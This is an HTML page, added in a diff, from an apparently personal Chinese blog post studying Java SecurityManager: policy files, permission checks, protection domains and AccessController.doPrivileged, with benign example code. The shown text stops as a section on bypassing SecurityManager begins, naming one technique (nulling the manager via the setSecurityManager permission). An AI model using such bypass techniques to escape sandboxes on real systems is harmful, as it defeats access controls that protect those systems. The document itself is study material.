@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 Java SecurityManager是什么Java SecurityManager是为应用程序定义安全策略的对象，通过策略指定不安全或敏感的操作，安全策略不允许的任何操作都会抛出SecurityException，应用程序可以查询其安全管理器允许的操作。 Java程序默认情况下都没有开启SecurityManager，如果开启了我们可以通过System.getSecurityMana">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java SecurityManager学习">
+<meta property="og:url" content="http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="0x01 Java SecurityManager是什么Java SecurityManager是为应用程序定义安全策略的对象，通过策略指定不安全或敏感的操作，安全策略不允许的任何操作都会抛出SecurityException，应用程序可以查询其安全管理器允许的操作。 Java程序默认情况下都没有开启SecurityManager，如果开启了我们可以通过System.getSecurityMana">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210929144409923.png">
+<meta property="article:published_time" content="2021-09-27T05:43:05.000Z">
+<meta property="article:modified_time" content="2021-09-27T05:43:05.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="SecurityManager">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210929144409923.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Java SecurityManager学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/09/21/Java%20URL%E8%B7%B3%E8%BD%AC%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java SecurityManager学习&body=Check out this article: http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=Java SecurityManager学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=Java SecurityManager学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Java-SecurityManager是什么"><span class="toc-number">1.</span> <span class="toc-text">0x01 Java SecurityManager是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-SecurityManager应用场景："><span class="toc-number">1.1.</span> <span class="toc-text">Java SecurityManager应用场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何启动SecurityManager？"><span class="toc-number">1.2.</span> <span class="toc-text">如何启动SecurityManager？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#管理SecurityManager配置文件："><span class="toc-number">1.3.</span> <span class="toc-text">管理SecurityManager配置文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过一个例子理解SecurityManager的作用"><span class="toc-number">1.4.</span> <span class="toc-text">通过一个例子理解SecurityManager的作用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-AccessController"><span class="toc-number">2.</span> <span class="toc-text">0x02 AccessController</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#域模型："><span class="toc-number">2.1.</span> <span class="toc-text">域模型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AccessController-checkPermission工作机制"><span class="toc-number">2.2.</span> <span class="toc-text">AccessController.checkPermission工作机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AccessController-doPrivileged-授予特权"><span class="toc-number">2.3.</span> <span class="toc-text">AccessController.doPrivileged()授予特权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Java-SecurityManager绕过"><span class="toc-number">3.</span> <span class="toc-text">0x03 Java SecurityManager绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-参考链接："><span class="toc-number">4.</span> <span class="toc-text">0x04 参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Java SecurityManager学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-27T05:43:05.000Z" itemprop="datePublished">2021-09-27</time>
+        
+        (Updated: <time datetime="2021-09-27T05:43:05.000Z" itemprop="dateModified">2021-09-27</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a> › <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/SecurityManager/">SecurityManager</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/SecurityManager/" rel="tag">SecurityManager</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-Java-SecurityManager是什么"><a href="#0x01-Java-SecurityManager是什么" class="headerlink" title="0x01 Java SecurityManager是什么"></a>0x01 Java SecurityManager是什么</h3><p>Java SecurityManager是为应用程序定义安全策略的对象，通过策略指定不安全或敏感的操作，安全策略不允许的任何操作都会抛出<code>SecurityException</code>，应用程序可以查询其安全管理器允许的操作。</p>
+<p>Java程序默认情况下都没有开启SecurityManager，如果开启了我们可以通过<code>System.getSecurityManager</code>获取安全管理器<code>java.lang.SecurityManager</code>对象，SecurityManager实现安全策略的管理，允许应用程序在执行可能敏感操作之前确定该操作是否被允许，应用程序可以允许或禁止该操作。</p>
+<p><code>java.lang.SecurityManager</code>包含很多checkXXX形式的方法，checkXXX方法用于检查XXX操作的权限，权限主要分为以下几类：文件、套接字、网络、安全、运行时、属性、AWT、反射和序列化，对于管理这些权限的类是<code>java.io.FilePermission</code>、 <code>java.net.SocketPermission</code>、<code>java.net.NetPermission</code>、 <code>java.security.SecurityPermission</code>、 <code>java.lang.RuntimePermission</code>、<code>java.util.PropertyPermission</code>、 <code>java.awt.AWTPermission</code>、 <code>java.lang.reflect.ReflectPermission</code>、和 <code>java.io.SerializablePermission</code>。</p>
+<h4 id="Java-SecurityManager应用场景："><a href="#Java-SecurityManager应用场景：" class="headerlink" title="Java SecurityManager应用场景："></a>Java SecurityManager应用场景：</h4><p>当运行未知Java程序，该程序可能有恶意代码（操作系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行代码的权限进行控制，就要启用Java安全管理器。</p>
+<h4 id="如何启动SecurityManager？"><a href="#如何启动SecurityManager？" class="headerlink" title="如何启动SecurityManager？"></a>如何启动SecurityManager？</h4><p>有两种方式启动：</p>
+<ol>
+<li>启动参数方式：<code>-Djava.security.manager</code>，若要同时指定配置文件的位置通过<code>-Djava.security.manager -Djava.security.policy=&quot;E:/java.policy&quot;</code></li>
+<li>编码下创建SecurityManager实例来启动：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager securityManager = <span class="keyword">new</span> SecurityManager();</span><br><span class="line">System.setSecurityManager(securityManager);</span><br><span class="line"><span class="comment">// 指定配置文件policy</span></span><br><span class="line">System.setProperty(<span class="string">"java.security.policy"</span>, <span class="string">"file:/E:/myTest.policy"</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="管理SecurityManager配置文件："><a href="#管理SecurityManager配置文件：" class="headerlink" title="管理SecurityManager配置文件："></a>管理SecurityManager配置文件：</h4><p>当配置文件没有被指定时，则会使用默认的安全策略配置文件<code>$JAVA_HOME/jre/lib/security/java.policy</code>。</p>
+<p>安全配置的基本原则如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、没有配置的权限表示禁止。</span><br><span class="line">2、只能配置允许的权限，不能配置禁止的操作。</span><br><span class="line">3、同一种权限可多次配置，取并集。</span><br><span class="line">4、同一资源的多种权限可用逗号分割。</span><br></pre></td></tr></table></figure>
+
+<p>以下是默认安全策略文件内容，分为两部分的授权，一是授权基于路径在”file:$/*”的class和jar包所有权限，二是针对权限的细粒度配置，可以参考每种类别的javadoc说明。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;&#x2F;*&quot; &#123;</span><br><span class="line">        permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; default permissions granted to all domains</span><br><span class="line">&#x2F;&#x2F; 定义了所有JAVA程序都拥有的权限，包括停止线程、启动Socket 服务器、读取部分系统属性</span><br><span class="line">grant &#123;</span><br><span class="line">        permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; allows anyone to listen on dynamic ports</span><br><span class="line">        permission java.net.SocketPermission &quot;localhost:0&quot;, &quot;listen&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; &quot;standard&quot; properies that can be read by anyone</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor.url&quot;, &quot;read&quot;;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.name&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过一个例子理解SecurityManager的作用"><a href="#通过一个例子理解SecurityManager的作用" class="headerlink" title="通过一个例子理解SecurityManager的作用"></a>通过一个例子理解SecurityManager的作用</h4><p>下面是一个通过SecurityManager配置授予指定文件读写权限的例子，只有授予文件权限才允许被读或写（代码放在GitHub了），CreatePolicy文件用来创建一个策略配置文件，也可以通过手动创建，TestFilePolicy用来测试文件读写权限。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreatePolicy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CreatePolicy createPolicy = <span class="keyword">new</span> CreatePolicy();</span><br><span class="line">        createPolicy.createFile(<span class="string">"E:/myTest.policy"</span>,<span class="string">"E:\\test.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在指定文件下生成一个policy文件，允许某个文件的读写</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allowFileName  指定配置文件保存位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> policyFileName 指定可读写文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">createFile</span><span class="params">(String policyFileName, String allowFileName)</span> </span>&#123;</span><br><span class="line">        allowFileName = allowFileName.replace(<span class="string">"\\"</span>, <span class="string">"/"</span>);</span><br><span class="line">        String policyContent = <span class="string">"grant &#123;\n"</span> +</span><br><span class="line">                <span class="string">"    permission java.io.FilePermission \""</span> + allowFileName + <span class="string">"\",\"read,write\";\n"</span> +</span><br><span class="line">                <span class="string">"&#125;;"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter fileWriter = <span class="keyword">new</span> FileWriter(policyFileName);</span><br><span class="line">            fileWriter.write(policyContent);</span><br><span class="line">            fileWriter.flush();</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFilePolicy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String policyFileName = <span class="string">"E:/fileTest.policy"</span>;</span><br><span class="line">        String allowFileName = <span class="string">"E:/test.txt"</span>;</span><br><span class="line">        <span class="comment">// 1、首先设置好policy文件</span></span><br><span class="line">        CreatePolicy createPolicy = <span class="keyword">new</span> CreatePolicy();</span><br><span class="line">        createPolicy.createFile(policyFileName, allowFileName);</span><br><span class="line">        System.setProperty(<span class="string">"java.security.policy"</span>, <span class="string">"file:/"</span> + policyFileName);</span><br><span class="line">        <span class="comment">// 2、启动 SecurityManager</span></span><br><span class="line">        SecurityManager securityManager = <span class="keyword">new</span> SecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">// 3、尝试写文件</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            securityManager.checkWrite(allowFileName);</span><br><span class="line">            write(<span class="keyword">new</span> File(allowFileName));</span><br><span class="line">            System.out.println(<span class="string">"file write ok"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(File file)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter fileWriter = <span class="keyword">new</span> FileWriter(file);</span><br><span class="line">            fileWriter.write(<span class="string">"test"</span>);</span><br><span class="line">            fileWriter.flush();</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行上面代码，由于通过策略文件授予了<code>E:/test.txt</code>文件的读写权限，应用可以成功写文件；如果删除注释中的1、2步骤，执行代码，由于没有配置安全管理器，应用可以任意写文件；如果删除<code>System.setProperty(&quot;java.security.policy&quot;, &quot;file:/&quot; + policyFileName);</code>对策略文件的配置，使用默认策略，写文件会失败，因为默认配置文件没有授予文件写的权限。</p>
+<p>因此通过上面这个例子，我们可以理解SecurityManager主要的作用就是配置权限，管理安全策略，防止不必要的授权。</p>
+<h3 id="0x02-AccessController"><a href="#0x02-AccessController" class="headerlink" title="0x02 AccessController"></a>0x02 AccessController</h3><h4 id="域模型："><a href="#域模型：" class="headerlink" title="域模型："></a>域模型：</h4><p>参考：<a href="https://tech101.cn/2019/08/15/AccessController%E7%9A%84doPrivileged%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8#%E5%9F%9F%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">https://tech101.cn/2019/08/15/AccessController%E7%9A%84doPrivileged%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8#%E5%9F%9F%E6%A8%A1%E5%9E%8B</a></p>
+<p>在当前最新的Java安全模型中，引入了 域（Domain）的概念。虚拟机会将所有代码加载到不同的域中。其中系统域负责和操作系统的资源进行交互，而各个应用域对系统资源的访问需要通过系统域的代理来实现受限访问。JVM中的不同域关联了不同的权限，处于域中的类将拥有这个域所包含的所有权限。</p>
+<p>在域模型中，为了实现权限控制，涉及到一些概念，包括：</p>
+<ol>
+<li>代码源(code source)：代码源表示类的来源URL地址，代码源由类加载器负责创建和管理。</li>
+<li>权限（permission）：封装特定操作的请求</li>
+<li>策略（policy）：策略是一组权限的总称，用于确定权限应该用于哪些代码源。</li>
+<li>保护域（protection domain）：封装代码和代码所拥有的权限，<strong>保护域可以理解为是代码源和权限映射关系的集合</strong>，一个类如果属于一个保护域，那么这个类将拥有这个域中的所有权限。</li>
+</ol>
+<p>这里codeBase相当于制定了代码源 哪些代码，<code>permission java.lang.FilePermission &quot;read&quot;;</code>指定了代码源拥有的权限，而保护域会将多个code source和多个permission之间的关系进行映射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:&#x2F;code&#x2F;A&#x2F;*&quot; &#123;</span><br><span class="line">        permission java.lang.FilePermission &quot;file1&quot;,&quot;read&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grant codeBase &quot;file:&#x2F;code&#x2F;B&#x2F;*&quot; &#123;</span><br><span class="line">        permission java.lang.FilePermission &quot;file1&quot;,&quot;read,write&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面策略对应的域如下：</p>
+<p><img src="/imgs/image-20210929144409923.png" alt="image-20210929144409923"></p>
+<h4 id="AccessController-checkPermission工作机制"><a href="#AccessController-checkPermission工作机制" class="headerlink" title="AccessController.checkPermission工作机制"></a><code>AccessController.checkPermission</code>工作机制</h4><p>上面例子中通过<code>securityManager.checkWrite(allowFileName);</code>检查文件的写权限，checkWrite方法调用checkPermission处理，最终委托给<code>AccessController.checkPermission(perm);</code>检查。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkWrite</span><span class="params">(String file)</span> </span>&#123;</span><br><span class="line">    checkPermission(<span class="keyword">new</span> FilePermission(file, securityConstants.FILE_WRITE_ACTION));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">    java.security.AccessController.checkPermission(perm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>AccessController判断权限的主体是调用者（Caller）。基于访问控制的规则，AccessController在进行权限判断的时候，它不仅仅检查当前Caller是否拥有权限，而是对整个调用链上的所有Caller进行权限检查。对调用链上的每个Caller，都会基于它们各自所属的ProtectionDomain中的权限集合进行检查。当满足下面的二个条件，则表示访问被授权：<br>1、在当前调用链上，从当前的Caller到初始Caller之间的所有Caller都能被各自所属的ProtectionDomain中的权限授权。<br>2、在当前调用链上，其中有一个Caller被标记为privilege并且被授权，同时接下来调用的过程中所有调用都能被各自的域授权。<br>如果上述的二点有任何一点不满足，则<code>AccessController.checkPermission()</code>会抛出<code>AccessControlException</code>。</p>
+</blockquote>
+<h4 id="AccessController-doPrivileged-授予特权"><a href="#AccessController-doPrivileged-授予特权" class="headerlink" title="AccessController.doPrivileged()授予特权"></a>AccessController.doPrivileged()授予特权</h4><p>Caller如何被标记为privilege？可以调用AccessController.doPrivileged()临时授权。</p>
+<p>将上面TestFilePolicy例子改写，上面的例子只有文件的写权限，我们需要临时用到读权限，通过doPrivileged满足。在main中添加调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4、用AccessController.doPrivileged赋予写文件特权</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">"file read ok"</span>);</span><br><span class="line">                read(<span class="keyword">new</span> File(allowFileName));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">                throwable.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (PrivilegedActionException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Java-SecurityManager绕过"><a href="#0x03-Java-SecurityManager绕过" class="headerlink" title="0x03 Java SecurityManager绕过"></a>0x03 Java SecurityManager绕过</h3><p>本次学习实验参考的<a href="https://github.com/codeplutos/java-security-manager-bypass。" target="_blank" rel="noopener">https://github.com/codeplutos/java-security-manager-bypass。</a></p>
+<p>1、通过授权RuntimePermission为setSecurityManager和设置SecurityManager为null，绕过check</p>
